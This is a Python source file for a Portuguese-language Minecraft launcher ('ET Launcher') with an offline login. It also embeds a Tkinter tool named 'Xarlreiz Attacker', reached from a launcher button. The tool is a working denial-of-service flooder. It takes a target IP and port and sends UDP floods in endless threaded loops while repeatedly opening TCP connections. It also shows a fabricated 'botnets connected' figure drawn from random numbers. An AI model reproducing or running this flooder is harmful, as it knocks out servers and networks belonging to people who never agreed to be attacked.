# et_launcher_unificado.py
import sys
import os
import subprocess # <-- ADICIONADO: Para executar o jogo
import threading
import time
import random
import socket
import uuid

from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QPushButton, QVBoxLayout,
    QGraphicsBlurEffect, QLineEdit
)
from PyQt5.QtGui import QPixmap, QPainter, QImage
from PyQt5.QtCore import Qt, QRect

# CORRIGIDO: Importa os módulos corretos da biblioteca
from minecraft_launcher_lib import install, command


# ==================== Xarlreiz Tool (index.py embutido) ====================

def iniciar_xarlreiz():
    import tkinter as tk
    from PIL import Image, ImageTk

    def resource_path(relative_path):
        return os.path.join(os.path.abspath("."), relative_path)

    def send_udp_packets(ip, port):
        global udp_sent, attack_running
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = b"A" * 1400
        while attack_running:
            try:
                for _ in range(1000):
                    sock.sendto(data, (ip, int(port)))
                    udp_sent += 1
            except:
                pass
            time.sleep(0.01)

    def send_tcp_packets(ip, port):
        global tcp_sent, attack_running
        data = b"A" * 1400
        while attack_running:
            try:
                for _ in range(1000):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        sock.connect((ip, int(port)))
                        sock.sendall(data)
                        sock.close()
                        tcp_sent += 1
                    except:
                        pass
            except:
                pass
            time.sleep(0.01)

    def update_packet_label():
        global udp_sent, tcp_sent
        if attack_running:
            total = udp_sent + tcp_sent
            packet_label.config(text=f"Pacotes enviados: {total}/s")
            udp_sent = 0
            tcp_sent = 0
            root.after(1000, update_packet_label)
        else:
            packet_label.config(text="Pacotes enviados: 0/s")

    def toggle_attack():
        global attack_running, udp_sent, tcp_sent

        ip = ip_entry.get()
        port = port_entry.get()

        if start_button["text"] == "Start":
            if not ip or not port:
                return
            try:
                int(port)
            except ValueError:
                return
            attack_running = True
            udp_sent = 0
            tcp_sent = 0

            threading.Thread(target=send_udp_packets, args=(ip, port), daemon=True).start()
            threading.Thread(target=send_tcp_packets, args=(ip, port), daemon=True).start()
            update_packet_label()
            start_button.config(text="Stop", bg="green")
        else:
            attack_running = False
            start_button.config(text="Start", bg="red")

    global attack_running, udp_sent, tcp_sent
    attack_running = False
    udp_sent = 0
    tcp_sent = 0

    root = tk.Tk()
    root.title("Xarlreiz Attacker - 1155 do ET Edition")
    root.geometry("600x400")
    root.resizable(False, False)

    try:
        bg_image = Image.open(resource_path("bg.png")).resize((600, 400))
        bg_photo = ImageTk.PhotoImage(bg_image)
        background_label = tk.Label(root, image=bg_photo)
        background_label.place(x=0, y=0, relwidth=1, relheight=1)
    except:
        root.configure(bg="black")

    frame = tk.Frame(root, bg='#000000', bd=2)
    frame.place(x=50, y=150)

    ip_label = tk.Label(frame, text="IP:", fg="white", bg="#000000", font=("Arial", 12))
    ip_label.grid(row=0, column=0, padx=5, pady=5)
    ip_entry = tk.Entry(frame, font=("Arial", 12), width=15)
    ip_entry.grid(row=0, column=1, padx=5, pady=5)

    port_label = tk.Label(frame, text="Port:", fg="white", bg="#000000", font=("Arial", 12))
    port_label.grid(row=0, column=2, padx=5, pady=5)
    port_entry = tk.Entry(frame, font=("Arial", 12), width=10)
    port_entry.grid(row=0, column=3, padx=5, pady=5)

    start_button = tk.Button(frame, text="Start", font=("Arial", 12, "bold"), bg="red", fg="white", command=toggle_attack)
    start_button.grid(row=0, column=4, padx=10)

    botnet_label = tk.Label(root, text=f"Botnets conectadas: {random.randint(50000, 1000000)}", fg="white", bg="#000000", font=("Arial", 10))
    botnet_label.place(x=10, y=370)

    packet_label = tk.Label(root, text="Pacotes enviados: 0/s", fg="white", bg="#000000", font=("Arial", 10))
    packet_label.place(x=400, y=370)

    root.mainloop()


# ==================== ET Launcher (principal) ====================

BACKGROUND_IMAGE = "bg.png"

class ETLauncher(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("ET Launcher - 1155 do ET")
        self.setFixedSize(800, 500)

        self.account = None
        
        if os.path.exists(BACKGROUND_IMAGE):
            self.bg = QImage(BACKGROUND_IMAGE).scaled(self.size(), Qt.IgnoreAspectRatio, Qt.SmoothTransformation)
        else:
            self.bg = QImage(self.size(), QImage.Format_RGB32)
            self.bg.fill(Qt.darkGray)

        self.panel_rect = QRect(200, 100, 400, 320)

        self.blur_label = QLabel(self)
        self.blur_label.setGeometry(self.panel_rect)
        self.blur_label.setPixmap(self.get_blurred_section(self.panel_rect))
        self.blur_label.setStyleSheet("border-radius: 20px;")

        self.container = QWidget(self)
        self.container.setGeometry(self.panel_rect)

        vbox = QVBoxLayout()
        vbox.setAlignment(Qt.AlignCenter)
        vbox.setSpacing(15)

        title = QLabel("ET Launcher")
        title.setStyleSheet("color: #32CD32; font-size: 28px; font-weight: bold;")
        title.setAlignment(Qt.AlignCenter)

        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("Digite seu nome de usuário")
        self.username_input.setAlignment(Qt.AlignCenter)

        self.login_button = QPushButton("Login Offline")
        self.play_button = QPushButton("Iniciar Minecraft")
        self.xarlreiz_button = QPushButton("Xarlreiz Tool")

        style_sheet = """
            QPushButton, QLineEdit {
                background-color: rgba(0, 0, 0, 160);
                color: white;
                font-size: 16px;
                border-radius: 15px;
                border: 1px solid rgba(255, 255, 255, 50);
            }
            QPushButton:hover {
                background-color: rgba(255, 255, 255, 40);
            }
            QLineEdit {
                padding: 5px;
            }
        """

        for widget in [self.username_input, self.login_button, self.play_button, self.xarlreiz_button]:
            widget.setFixedHeight(40)
            widget.setStyleSheet(style_sheet)

        self.play_button.setEnabled(False)

        self.login_button.clicked.connect(self.login_offline)
        self.play_button.clicked.connect(self.launch_game)
        self.xarlreiz_button.clicked.connect(iniciar_xarlreiz)

        vbox.addWidget(title)
        vbox.addWidget(self.username_input)
        vbox.addWidget(self.login_button)
        vbox.addWidget(self.play_button)
        vbox.addWidget(self.xarlreiz_button)

        self.container.setLayout(vbox)

    def get_blurred_section(self, rect: QRect):
        cropped = self.bg.copy(rect)
        blur_widget = QLabel()
        blur_widget.setPixmap(QPixmap.fromImage(cropped))
        blur_widget.setFixedSize(rect.size())
        blur = QGraphicsBlurEffect()
        blur.setBlurRadius(20)
        blur_widget.setGraphicsEffect(blur)
        result = QPixmap(rect.size())
        result.fill(Qt.transparent)
        blur_widget.render(result)
        return result

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.drawImage(0, 0, self.bg)

    def launch_game(self):
        if not self.account:
            return
        
        minecraft_directory = os.path.join(os.path.expanduser('~'), ".etlauncher_minecraft")
        if not os.path.exists(minecraft_directory):
            os.makedirs(minecraft_directory)
            
        options = {
            "username": self.account["name"],
            "uuid": self.account["uuid"],
            "token": self.account["access_token"],
            "jvmArguments": ["-Xmx2G", "-Xms2G"]
        }
        
        version = "1.20.1"
        
        def game_thread():
            try:
                print(f"Instalando Minecraft {version} em {minecraft_directory}...")
                # CORRIGIDO: Usa o módulo 'install'
                install.install_minecraft_version(versionid=version, minecraft_directory=minecraft_directory)
                print("Instalação concluída. Gerando comando para iniciar...")
                
                # CORRIGIDO: Usa o módulo 'command' para gerar o comando e 'subprocess' para executar
                minecraft_command = command.get_minecraft_command(version=version, minecraft_directory=minecraft_directory, options=options)
                print("Iniciando o jogo...")
                subprocess.run(minecraft_command)

            except Exception as e:
                print(f"Ocorreu um erro ao iniciar o Minecraft: {e}")

        # Desabilita o botão de jogar para evitar múltiplos cliques
        self.play_button.setText("Iniciando...")
        self.play_button.setEnabled(False)
        threading.Thread(target=game_thread, daemon=True).start()

    def login_offline(self):
        username = self.username_input.text()
        if not username:
            print("Por favor, insira um nome de usuário.")
            return

        offline_uuid = str(uuid.uuid3(uuid.NAMESPACE_DNS, username))

        self.account = {
           "name": username,
           "uuid": offline_uuid,
           "access_token": "0"
        }
        self.login_button.setText(f"Logado como {username}")
        self.login_button.setEnabled(False)
        self.username_input.setEnabled(False)
        self.play_button.setEnabled(True)
        print(f"Login offline realizado com sucesso como: {username}")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    launcher = ETLauncher()
    launcher.show()
    sys.exit(app.exec_())
